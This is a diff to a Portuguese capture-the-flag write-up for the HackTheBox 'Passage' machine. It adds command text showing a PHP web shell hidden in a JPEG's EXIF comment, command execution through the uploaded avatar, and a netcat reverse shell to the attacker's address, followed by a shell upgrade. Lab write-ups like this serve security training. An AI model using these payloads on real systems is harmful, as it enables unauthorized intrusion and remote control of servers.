@@ -85,9 +85,15 @@ Como é um campo de upload de 'Avatar' podemos deduzir que o campo aceitará ima
 Para isso vamos utilizar o exiftool:
 
 ![Image](https://i.imgur.com/yECy7Qo.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+exiftool -Comment='<?php echo "<pre>"; system($_GET['chu']); ?>' chu.jpeg;
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Podemos conferir que conseguimos escrever o comentário dentro da imagem:
 ![Image](https://i.imgur.com/hHNNM0w.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+exiftool chu.jpeg
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Agora vamos tentar fazer o upload.
 Primeiro vamos ligar o BurpSuite para interceptar a requisição
@@ -109,16 +115,28 @@ Agora basta acessarmos nosso arquivo para poder executar comandos no servidor, p
 Conseguimos acessar nosso arquivo, agora podemos passar comandos pelo parametro pré definido, em meu caso 'cmd'.
 Com isso temos uma execução de código remoto :D
 ![Image](https://i.imgur.com/RU7sxGJ.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=id
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Ao pesquisar pelo nc, podemos ver que ele está instalado, portanto, vamos tentar utiliza-lo.
 ![Image](https://i.imgur.com/5NgSWmB.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=whereis nc
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Vamos abrir uma porta em nossa máquina.
 
 ![Image](https://i.imgur.com/55Noqa6.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -vvnlp 1337
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Agora vamos enviar a conexão com o netcat
 ![Image](https://i.imgur.com/IrydT8Z.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=/bin/nc 10.10.14.238 1337 -e /bin/bash
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ![Image](https://i.imgur.com/FswUPdW.png)
 
@@ -126,7 +144,9 @@ w00t, estamos dentro!
 
 Podemos melhorar nossa shell com python para ela se tornar interativa
 ![Image](https://i.imgur.com/KnYikce.png)
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+python -c 'import pty;pty.spawn("/bin/bash")'
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Após um tempo procurando algo para escalar privilégios, podemos encontrar um arquivo chamado lines, no diretório: /var/www/html/CuteNews/cdata/users/lines
 ![Image](https://i.imgur.com/sxqmNKL.png)
